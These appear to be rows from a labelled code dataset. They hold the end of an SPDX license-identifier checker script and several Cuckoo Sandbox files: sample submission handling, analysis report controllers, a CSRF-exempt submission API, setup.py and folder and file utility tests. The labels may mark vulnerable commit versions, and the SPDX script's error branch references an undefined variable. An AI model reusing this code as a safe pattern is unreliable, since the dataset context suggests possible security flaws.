            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",1
44,44,168cabf86730d56b7fa319278bf0f0034052666a,"cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, filename)

                unpacked = sflock.unpack(
                    filepath=filepath, password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree(sanitize=True)

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return files

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/ncuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.common.mongo import mongo
from cuckoo.core.database import Database, TASK_PENDING

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")

        task = db.view_task(task_id, details=True)
        if not task:
            return Http404(""Task not found"")

        entry = task.to_dict()
        entry[""guest""] = {}
        if task.guest:
            entry[""guest""] = task.guest.to_dict()

        entry[""errors""] = []
        for error in task.errors:
            entry[""errors""].append(error.message)

        entry[""sample""] = {}
        if task.sample_id:
            sample = db.view_sample(task.sample_id)
            entry[""sample""] = sample.to_dict()

        entry[""target""] = os.path.basename(entry[""target""])
        return {
            ""task"": entry,
        }

    @staticmethod
    def get_recent(limit=50, offset=0):
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/ncuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        files = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""files"": files,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/nsetup.py/n/n#!/usr/bin/env python
# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - https://cuckoosandbox.org/.
# See the file 'docs/LICENSE' for copying permission.

import os
import setuptools
import sys

# Update the MANIFEST.in file to include the one monitor version that is
# actively shipped for this distribution and exclude all the other monitors
# that we have lying around. Note: I tried to do this is in a better manner
# through exclude_package_data, but without much luck.

excl, monitor = [], os.path.join(""cuckoo"", ""data"", ""monitor"")
latest = open(os.path.join(monitor, ""latest""), ""rb"").read().strip()
for h in os.listdir(monitor):
    if h != ""latest"" and h != latest:
        excl.append(
            ""recursive-exclude cuckoo/data/monitor/%s *  # AUTOGENERATED"" % h
        )

if not os.path.isdir(os.path.join(monitor, latest)) and \
        not os.environ.get(""ONLYINSTALL""):
    sys.exit(
        ""Failure locating the monitoring binaries that belong to the latest ""
        ""monitor release. Please include those to create a distribution.""
    )

manifest = []
for line in open(""MANIFEST.in"", ""rb""):
    if not line.strip() or ""# AUTOGENERATED"" in line:
        continue

    manifest.append(line.strip())

manifest.extend(excl)

open(""MANIFEST.in"", ""wb"").write(""\n"".join(manifest) + ""\n"")

def githash():
    """"""Extracts the current Git hash.""""""
    git_head = os.path.join("".git"", ""HEAD"")
    if os.path.exists(git_head):
        head = open(git_head, ""rb"").read().strip()
        if not head.startswith(""ref: ""):
            return head

        git_ref = os.path.join("".git"", head.split()[1])
        if os.path.exists(git_ref):
            return open(git_ref, ""rb"").read().strip()

cwd_path = os.path.join(""cuckoo"", ""data-private"", "".cwd"")
open(cwd_path, ""wb"").write(githash() or """")

install_requires = []

# M2Crypto relies on swig being installed. We also don't support the latest
# version of SWIG. We should be replacing M2Crypto by something else when
# the time allows us to do so.
if os.path.exists(""/usr/bin/swig""):
    install_requires.append(""m2crypto==0.24.0"")

setuptools.setup(
    name=""Cuckoo"",
    version=""2.0.0"",
    author=""Stichting Cuckoo Foundation"",
    author_email=""cuckoo@cuckoofoundation.org"",
    packages=[
        ""cuckoo"",
    ],
    classifiers=[
        ""Development Status :: 4 - Beta"",
        # TODO: should become stable.
        # ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Environment :: Web Environment"",
        ""Framework :: Django"",
        ""Framework :: Flask"",
        ""Framework :: Pytest"",
        ""Intended Audience :: Information Technology"",
        ""Intended Audience :: Science/Research"",
        ""Natural Language :: English"",
        ""License :: OSI Approved :: GNU General Public License v3 (GPLv3)"",
        ""Operating System :: POSIX :: Linux"",
        ""Programming Language :: Python :: 2.7"",
        ""Topic :: Security"",
    ],
    url=""https://cuckoosandbox.org/"",
    license=""GPLv3"",
    description=""Automated Malware Analysis System"",
    include_package_data=True,
    entry_points={
        ""console_scripts"": [
            ""cuckoo = cuckoo.main:main"",
        ],
    },
    install_requires=[
        ""alembic==0.8.8"",
        ""androguard==3.0"",
        ""beautifulsoup4==4.4.1"",
        ""chardet==2.3.0"",
        ""click==6.6"",
        ""django==1.8.4"",
        ""django_extensions==1.6.7"",
        ""dpkt==1.8.7"",
        ""elasticsearch==2.2.0"",
        ""flask==0.10.1"",
        ""httpreplay==0.1.18"",
        ""jinja2==2.8"",
        ""jsbeautifier==1.6.2"",
        ""lxml==3.6.0"",
        ""oletools==0.42"",
        ""peepdf==0.3.2"",
        ""pefile2==1.2.11"",
        ""pillow==3.2"",
        ""pymisp==2.4.54"",
        ""pymongo==3.0.3"",
        ""python-dateutil==2.4.2"",
        ""python-magic==0.4.12"",
        ""sflock==0.2.5"",
        ""sqlalchemy==1.0.8"",
        ""wakeonlan==0.2.2"",
    ] + install_requires,
    extras_require={
        "":sys_platform == 'win32'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'darwin'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'linux2'"": [
            ""requests[security]==2.7.0"",
            ""scapy==2.3.2"",
        ],
        ""distributed"": [
            ""flask-sqlalchemy==2.1"",
            ""gevent==1.1.1"",
            ""psycopg2==2.6.2"",
        ],
        ""postgresql"": [
            ""psycopg2==2.6.2"",
        ],
    },
    setup_requires=[
        ""pytest-runner"",
    ],
    tests_require=[
        ""coveralls"",
        ""pytest"",
        ""pytest-cov"",
        ""pytest-django"",
        ""pytest-pythonpath"",
        ""flask-sqlalchemy==2.1"",
        ""mock==2.0.0"",
        ""responses==0.5.1"",
    ],
)
/n/n/ntests/test_utils.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import cStringIO
import io
import mock
import os
import pytest
import shutil
import tempfile

import cuckoo

from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage, temppath
from cuckoo.common import utils
from cuckoo.misc import set_cwd

class TestCreateFolders:
    def setup(self):
        self.tmp_dir = tempfile.gettempdir()

    def test_root_folder(self):
        """"""Tests a single folder creation based on the root parameter.""""""
        Folders.create(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_single_folder(self):
        """"""Tests a single folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_multiple_folders(self):
        """"""Tests multiple folders creation.""""""
        Folders.create(self.tmp_dir, [""foo"", ""bar""])
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""bar""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""bar""))

    def test_copy_folder(self):
        """"""Tests recursive folder copy""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.copy(""tests/files/sample_analysis_storage"", dirpath)
        assert os.path.isfile(""%s/reports/report.json"" % dirpath)

    def test_duplicate_folder(self):
        """"""Tests a duplicate folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.create(self.tmp_dir, ""foo"")
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder(self):
        """"""Tests folder deletion #1.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(os.path.join(self.tmp_dir, ""foo""))
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder2(self):
        """"""Tests folder deletion #2.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(self.tmp_dir, ""foo"")
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_create_temp(self):
        """"""Test creation of temporary directory.""""""
        dirpath1 = Folders.create_temp(""/tmp"")
        dirpath2 = Folders.create_temp(""/tmp"")
        assert os.path.exists(dirpath1)
        assert os.path.exists(dirpath2)
        assert dirpath1 != dirpath2

    def test_create_temp_conf(self):
        """"""Test creation of temporary directory with configuration.""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        dirpath2 = Folders.create_temp()
        assert dirpath2.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    @pytest.mark.skipif(""sys.platform != 'linux2'"")
    def test_create_invld_linux(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""/invalid/directory"")

    @pytest.mark.skipif(""sys.platform != 'win32'"")
    def test_create_invld_windows(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""Z:\\invalid\\directory"")

    def test_delete_invld(self):
        """"""Test deletion of a folder we can't access.""""""
        dirpath = tempfile.mkdtemp()

        os.chmod(dirpath, 0)
        with pytest.raises(CuckooOperationalError):
            Folders.delete(dirpath)

        os.chmod(dirpath, 0775)
        Folders.delete(dirpath)

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""a"")
        Folders.create((dirpath, ""a""), ""b"")
        Files.create((dirpath, ""a"", ""b""), ""c.txt"", ""nested"")

        filepath = os.path.join(dirpath, ""a"", ""b"", ""c.txt"")
        assert open(filepath, ""rb"").read() == ""nested""

class TestCreateFile:
    def test_temp_file(self):
        filepath1 = Files.temp_put(""hello"", ""/tmp"")
        filepath2 = Files.temp_put(""hello"", ""/tmp"")
        assert open(filepath1, ""rb"").read() == ""hello""
        assert open(filepath2, ""rb"").read() == ""hello""
        assert filepath1 != filepath2

    def test_create(self):
        dirpath = tempfile.mkdtemp()
        Files.create(dirpath, ""a.txt"", ""foo"")
        assert open(os.path.join(dirpath, ""a.txt""), ""rb"").read() == ""foo""
        shutil.rmtree(dirpath)

    def test_named_temp(self):
        filepath = Files.temp_named_put(""test"", ""hello.txt"", ""/tmp"")
        assert open(filepath, ""rb"").read() == ""test""
        assert os.path.basename(filepath) == ""hello.txt""

    def test_temp_conf(self):
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        filepath = Files.temp_put(""foo"")
        assert filepath.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    def test_stringio(self):
        filepath = Files.temp_put(cStringIO.StringIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_bytesio(self):
        filepath = Files.temp_put(io.BytesIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_create_bytesio(self):
        dirpath = tempfile.mkdtemp()
        filepath = Files.create(dirpath, ""a.txt"", io.BytesIO(""A""*1024*1024))
        assert open(filepath, ""rb"").read() == ""A""*1024*1024

    def test_hash_file(self):
        filepath = Files.temp_put(""hehe"", ""/tmp"")
        assert Files.md5_file(filepath) == ""529ca8050a00180790cf88b63468826a""
